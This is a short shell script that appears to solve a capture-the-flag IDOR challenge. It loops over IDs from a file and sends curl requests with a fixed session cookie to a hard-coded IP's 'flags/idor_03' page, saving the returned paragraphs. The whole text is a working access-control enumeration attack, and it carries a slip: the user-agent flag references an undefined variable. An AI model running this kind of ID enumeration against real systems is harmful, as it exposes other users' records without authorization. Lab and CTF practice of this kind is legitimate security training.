#!/bin/sh

url="https://104.197.157.31/public/protected/flags/idor_03/index.php?id"
cookie="PHPSESSID=ju37v0bkcloeuu2ut93pdlpfi2"
header1="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
user_agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0"

while read NAME; do
    echo "INDEX: $NAME"
    content="$(curl -X GET "$url=$NAME" -b "$cookie" -H "$header1" -A "$header2" -k -s)"
    echo "$content" | grep "p>" >> output123.txt  
done < names.txt